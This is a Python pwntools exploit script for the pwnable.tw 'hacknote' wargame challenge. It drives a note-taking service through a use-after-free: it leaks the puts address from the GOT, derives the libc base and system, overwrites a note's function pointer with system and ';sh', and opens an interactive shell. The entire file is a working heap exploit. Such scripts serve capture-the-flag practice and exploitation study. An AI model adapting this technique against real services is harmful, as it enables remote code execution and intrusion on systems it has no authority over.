from pwn import *

context.arch = 'i386'

from sys import argv
if argv[1] == 'remote':
    host = 'chall.pwnable.tw'
    port = 10102
else:
    host = '127.0.0.1'
    port = 8888
r = remote(host, port)

def add_note(size, content, sendline=True):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(content)
    else:
        r.send(content)

def delete_note(index):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(index).encode())

def print_note(index):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(index).encode())

print_note_content = 0x0804862b
puts_got = 0x0804a024
puts_off = 0x5f140
system_off = 0x3a940

add_note(0x20, b'a') # 0
add_note(0x20, b'a') # 1
delete_note(0)
delete_note(1)

add_note(0x8, p32(print_note_content) + p32(puts_got), False) # 2
print_note(0)
puts = u32(r.recvn(4).ljust(4, b'\x00'))
# print('puts =', hex(puts))
r.recvuntil('\n')
libc = puts - puts_off
system = libc + system_off
print('system =', hex(system))

delete_note(2)
add_note(0x8, p32(system) + b';sh') # 2
# add_note(0x8, p32(libc + 0x49670) + b's') # 2
# print_note(2)
print_note(0)

r.interactive()
